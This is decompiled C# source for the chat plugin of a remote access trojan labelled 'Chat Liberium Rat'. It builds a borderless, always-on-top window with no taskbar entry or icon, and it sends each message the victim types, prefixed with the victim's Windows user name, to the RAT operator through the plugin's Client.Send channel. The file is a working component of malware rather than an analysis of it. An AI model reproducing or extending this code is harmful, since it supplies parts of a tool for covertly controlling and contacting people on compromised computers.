using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using CustomControls.RJControls;
using Leb128;
using Plugin.Helper;

namespace Plugin;

public class Form1 : Form
{
	private IContainer components;

	public RJTextBox rjTextBox1;

	private Panel panel1;

	private Label label1;

	public RichTextBox richTextBox1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		((Control)rjTextBox1.textBox1).KeyDown += new KeyEventHandler(_KeyClick);
	}

	private void _KeyClick(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		if ((int)e.KeyCode == 13 && !string.IsNullOrEmpty(((Control)rjTextBox1.textBox1).Text))
		{
			Client.Send(LEB128.Write(new object[3]
			{
				"Chat",
				"Message",
				Environment.UserName + ": " + ((Control)rjTextBox1.textBox1).Text + "\n"
			}));
			RichTextBox val = richTextBox1;
			((Control)val).Text = ((Control)val).Text + Environment.UserName + ": " + ((Control)rjTextBox1.textBox1).Text + "\n";
			((TextBoxBase)richTextBox1).SelectionStart = ((Control)richTextBox1).Text.Length;
			((TextBoxBase)richTextBox1).ScrollToCaret();
			((Control)rjTextBox1.textBox1).Text = "";
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Expected O, but got Unknown
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d4: Expected O, but got Unknown
		rjTextBox1 = new RJTextBox();
		panel1 = new Panel();
		label1 = new Label();
		richTextBox1 = new RichTextBox();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)rjTextBox1).BackColor = SystemColors.Window;
		rjTextBox1.BorderColor = Color.FromArgb(192, 0, 192);
		rjTextBox1.BorderFocusColor = Color.HotPink;
		rjTextBox1.BorderRadius = 0;
		rjTextBox1.BorderSize = 1;
		((Control)rjTextBox1).Dock = (DockStyle)2;
		((Control)rjTextBox1).Font = new Font("Microsoft Sans Serif", 9.5f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)rjTextBox1).ForeColor = Color.FromArgb(64, 64, 64);
		((Control)rjTextBox1).Location = new Point(0, 414);
		((Control)rjTextBox1).Margin = new Padding(4);
		rjTextBox1.Multiline = false;
		((Control)rjTextBox1).Name = "rjTextBox1";
		((Control)rjTextBox1).Padding = new Padding(10, 7, 10, 7);
		rjTextBox1.PasswordChar = false;
		rjTextBox1.PlaceholderColor = Color.DarkGray;
		rjTextBox1.PlaceholderText = "";
		((Control)rjTextBox1).Size = new Size(416, 31);
		((Control)rjTextBox1).TabIndex = 18;
		rjTextBox1.Texts = "";
		rjTextBox1.UnderlinedStyle = false;
		((Control)panel1).BackColor = Color.White;
		((Control)panel1).Controls.Add((Control)(object)label1);
		((Control)panel1).Dock = (DockStyle)1;
		((Control)panel1).Location = new Point(0, 0);
		((Control)panel1).Name = "panel1";
		((Control)panel1).Size = new Size(416, 23);
		((Control)panel1).TabIndex = 19;
		((Control)label1).AutoSize = true;
		((Control)label1).BackColor = Color.White;
		((Control)label1).ForeColor = Color.MediumSlateBlue;
		((Control)label1).Location = new Point(7, 4);
		((Control)label1).Name = "label1";
		((Control)label1).Size = new Size(91, 13);
		((Control)label1).TabIndex = 20;
		((Control)label1).Text = "Chat Liberium Rat";
		((Control)richTextBox1).BackColor = Color.White;
		((TextBoxBase)richTextBox1).BorderStyle = (BorderStyle)0;
		((Control)richTextBox1).Dock = (DockStyle)5;
		((Control)richTextBox1).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)204);
		((Control)richTextBox1).ForeColor = Color.MediumSlateBlue;
		((Control)richTextBox1).Location = new Point(0, 23);
		((Control)richTextBox1).Name = "richTextBox1";
		((TextBoxBase)richTextBox1).ReadOnly = true;
		((Control)richTextBox1).Size = new Size(416, 391);
		((Control)richTextBox1).TabIndex = 20;
		((Control)richTextBox1).Text = "";
		((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Form)this).ClientSize = new Size(416, 445);
		((Control)this).Controls.Add((Control)(object)richTextBox1);
		((Control)this).Controls.Add((Control)(object)panel1);
		((Control)this).Controls.Add((Control)(object)rjTextBox1);
		((Form)this).FormBorderStyle = (FormBorderStyle)0;
		((Form)this).MaximizeBox = false;
		((Form)this).MinimizeBox = false;
		((Control)this).Name = "Form1";
		((Form)this).ShowIcon = false;
		((Form)this).ShowInTaskbar = false;
		((Form)this).StartPosition = (FormStartPosition)1;
		((Control)this).Text = "Chat Liberium Rat";
		((Form)this).TopMost = true;
		((Form)this).Load += Form1_Load;
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
